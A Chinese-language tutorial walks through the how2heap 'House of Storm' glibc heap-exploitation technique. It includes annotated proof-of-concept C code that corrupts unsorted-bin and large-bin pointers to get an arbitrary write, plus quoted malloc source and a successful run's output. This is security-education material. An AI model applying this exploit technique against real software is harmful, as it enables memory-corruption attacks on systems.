## House of Storm


#### 本教程是基于how2heap上面glibc-2.23的同名程序进行的,适用于glibc-2.23~glibc-2.28

### 机制介绍
* **本机制需要用到一个unsortedbin和一个largebin实现任意地址写**
* **本机制因为有很大的可能分配到的chunk的size高位字节在处理之后&0x8==0x8或者NON_MAIN_ARENA但是NON_MMAP，这会导致后续malloc过程报错，无法利用**
* **需要一个unsortedbin和一个largebin，unsortedbin大小要比largebin大，但是要保证两个在整理后会在同一个largebin里面**
* **先通过free+malloc联动，把largebin放进对应的largebin里面，unsortedbin就留在unsortedbin**
* **unsortedbin的bk指针指向target,largebin的bk指针指向一个合法的地址（不能为空），bk_nextsize指向target_size-offset，这里的offset会使得target处被当作chunk时的size域存入一个地址的高位字节**
* **最后malloc这个高位字节大小的块，系统先看unsortedbin，第一个是原本的unsortedbin，它非常大，所以把他放入largebin**
* **正好触发largebin的整理，victim->bk_nextsize->fd_nextsize=victim,实现修改target的size位置的值使其变成我们要malloc的这个size（高位字节大小）**
* **unsortedbin沿bk链走到下一个，也就是target，根据他的size，发现它正好符合，直接分配出来**
* **我们成功拿到target地址，现在可以任意写了**

### 源码解释
```c
// how2heap/glibc_2.23/house_of_storm.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char filler[0x10];
char target[0x60];

void init(){
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        // clearenv();
}

// Get the AMOUNT to shift over for size and the offset on the largebin.
// Needs to be a valid minimum sized chunk in order to work.
int get_shift_amount(char* pointer){

        int shift_amount = 0;
        long long ptr = (long long)pointer;

        while(ptr > 0x20){
                ptr = ptr >> 8;
                shift_amount += 1;
        }

        return shift_amount - 1; // Want amount PRIOR to this being zeroed out
}

int main(){

	init();

	char *unsorted_bin, *large_bin, *fake_chunk, *ptr;

	puts("House of Storm");
	puts("======================================");
	puts("Preparing chunks for the exploit");
	puts("Put one chunk into unsorted bin and the other into the large bin");
	puts("The unsorted bin chunk MUST be larger than the large bin chunk.");
	/*
	Putting a chunk into the unsorted bin and another
	into the large bin.
	*/
	unsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 // 第一个是unsortedbin的chunk

	// prevent merging
	malloc ( 0x18 );

	puts("Find the proper chunk size to allocate.");
	puts("Must be exactly the size of the written chunk from above.");
	/*
	Find the proper size to allocate
	We are using the first 'X' bytes of the heap to act
	as the 'size' of a chunk. Then, we need to allocate a
	chunk exactly this size for the attack to work.

	So, in order to do this, we have to take the higher
	bits of the heap address and allocate a chunk of this
	size, which comes from the upper bytes of the heap address.

	NOTE:
	- This does have a 1/2 chance of failing. If the 4th bit
	of this value is set, then the size comparison will fail.
	- Without this calculation, this COULD be brute forced.
	*/
	int shift_amount = get_shift_amount(unsorted_bin);
    printf("Shift Amount: %d\n", shift_amount);

    size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
    if(alloc_size < 0x10){
            printf("Chunk Size: 0x%lx\n", alloc_size);
            puts("Chunk size is too small");
            exit(1);
    }
    alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // Remove the size bits
    printf("In this case, the chunk size is 0x%lx\n", alloc_size); // 把我们malloc到的unsortedbin的最高字节-0x1再-0x10，这就是我们之后最后要malloc的fake chunk大小


	// Checks to see if the program will crash or not
        /*
        The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first.

        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
        validates to see if ONE of the following cases is true:
        - av == arena_for_chunk (mem2chunk (mem))
        - chunk is mmaped

        If the 'non-main arena' bit is set on the chunk, then the
        first case will fail.
        If the mmap bit is set, then this will pass.

        So, either the arenas need to match up (our fake chunk is in the
        .bss section for this demo. So, clearly, this will not happen) OR
        the mmap bit must be set.

        The logic below validates that the fourth bit of the size
        is NOT set and that either the mmap bit is set or the non-main
        arena bit is NOT set. If this is the case, the exploit should work.
        */

    /* 
    	这个alloc_size检查是最严苛的检查，因为chunk的size一般要满足这里的条件，才能是合法的size。
    	1. size & 0x8 != 0
    	2. size 要么是main arena上的，要么就是non_main_arena+mmap
    */
    if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){ 
            puts("Allocation size has bit 4 of the size set or ");
            puts("mmap and non-main arena bit check will fail");
            puts("Please try again! :)");
            puts("Exiting...");
            return 1;
	}

	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 // largebin一定要比unsortedbin小一点，但是不能小太多，因为要放到同一个bin里面
	// prevent merging
	malloc ( 0x18 );

	// FIFO
	free ( large_bin );  // put small chunks first
	free ( unsorted_bin ); // 先把两个chunk释放到unsortedbin里面

	// Put the 'large bin' chunk into the large bin
	unsorted_bin = malloc(0x4e8); // 再把unsortedbin分配回来，让largebin进入对应的bin里面
	free(unsorted_bin); // 再让unsortedbin回到unsortedbin里面

	// The address that we want to write to!
	fake_chunk = target - 0x10; // 我们要拿到的目标地址就是target

	puts("Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator");

	
	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk 把unsortedbin的bk指针改到fake chunk，方便之后malloc直接拿到，
	// 但是这个fake chunk的size还是空的，需要我们往里面填

	// Only needs to be a valid address.
	(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin->bk // 这是为了让bk指针指向有效地址，防止largebin修补链条的时候崩溃

	puts("Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location");
	puts("of your fake chunk.");
	puts("Misalign the location in order to use the primitive as a SIZE value.");
	puts("The 'offset' changes depending on if the binary is PIE (5) or not PIE (2).");
	puts("Vulnerability #2!");
	puts("Overwrite large bins bk->nextsize with the address to put our fake chunk size at.");
	
	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize
	// 这里走的是下面这段代码，把largebin的bk_nextsize改成了fake_chunk - 0x18 - shift_amount，那么就会执行
	/*
		else
		{
		  assert ((fwd->size & NON_MAIN_ARENA) == 0);
		  while ((unsigned long) size < fwd->size)
		    {
		      fwd = fwd->fd_nextsize;
		      assert ((fwd->size & NON_MAIN_ARENA) == 0);
		    }

		  if ((unsigned long) size == (unsigned long) fwd->size)
		    
		    fwd = fwd->fd;
		  else
		    {
		      victim->fd_nextsize = fwd;
		      victim->bk_nextsize = fwd->bk_nextsize; // 这个就是largebin的bk_nextsize
		      fwd->bk_nextsize = victim;
		      victim->bk_nextsize->fd_nextsize = victim; // largebin->bk_nextsize->fd_nextsize=fake_chunk+0x8-shift_amount<==victim(unsortedbin_addr)
		      // 在fake chunk的size前面几个字节往里面写一个堆空间地址(就是我们分配的那个unsortedbin的块的地址)，高位字节正好落入fake chunk size
		      // 至于为什么victim会是unsortedbin那个块，请看下面
		    }
		  bck = fwd->bk;
		}
	*/

	puts("Make allocation of the size that the value will be written for.");
	puts("Once the allocation happens, the madness begins");
	puts("Once in the unsorted bin, the 'large bin' chunk will be used in orer to ");
	puts("write a fake 'size' value to the location of our target.");
	puts("After this, the target will have a valid size.");
	puts("Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid");
	puts("size and remove it from the bin.");
	puts("With this, we have pulled out an arbitrary chunk!");

	printf("String before: %s\n", target);
	printf("String pointer: %p\n", target);

	ptr = malloc(alloc_size); // 你在malloc这个小的size的块的时候，系统首先检查unsortedbin，发现里面现在的那个块太大了，所以先要把它放入largebin
	// 他在largebin里面应该进入的是之前进入过largebin的那个块所在的bin
	// 触发了largebin的整理，就会执行largebin->bk_nextsize->fd_nextsize=fake_chunk+0x8-shift_amount<==victim(unsortedbin_addr)
	// 这样就成功在fake chunk的size域写入了一个size
	// 我们这里继续沿unsortedbin的bk链走，发现下一个就是fake chunk，他的size是我们刚才改出来的这个unsortedbin chunk的地址的高位字节，也就是alloc_size+0x10(只不过是最低一字节的标志位不太一样罢了，malloc的时候会把最低1字节忽视掉)
	strncpy(ptr, "\x41\x42\x43\x44\x45\x46\x47", 0x58 - 1);

	printf("String after %s\n", target); // 成功修改！
	printf("Fake chunk ptr: %p\n", ptr); 

	return 0;
}
```


### gdb调试解释
* **因为真的很难拿到size最低一字节满足那个最严苛的检查，所以我只展示运行成功的样例结果**
```bash
$ ./glibc_2.23/house_of_storm
^[[AHouse of Storm
======================================
Preparing chunks for the exploit
Put one chunk into unsorted bin and the other into the large bin
The unsorted bin chunk MUST be larger than the large bin chunk.
Find the proper chunk size to allocate.
Must be exactly the size of the written chunk from above.
Shift Amount: 5
In this case, the chunk size is 0x46
Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.
 This is our target location to get from the allocator
Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location
of your fake chunk.
Misalign the location in order to use the primitive as a SIZE value.
The 'offset' changes depending on if the binary is PIE (5) or not PIE (2).
Vulnerability #2!
Overwrite large bins bk->nextsize with the address to put our fake chunk size at.
Make allocation of the size that the value will be written for.
Once the allocation happens, the madness begins
Once in the unsorted bin, the 'large bin' chunk will be used in orer to
write a fake 'size' value to the location of our target.
After this, the target will have a valid size.
Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid
size and remove it from the bin.
With this, we have pulled out an arbitrary chunk!
String before:
String pointer: 0x57667acbf060
String after ABCDEFG
Fake chunk ptr: 0x57667acbf060
```

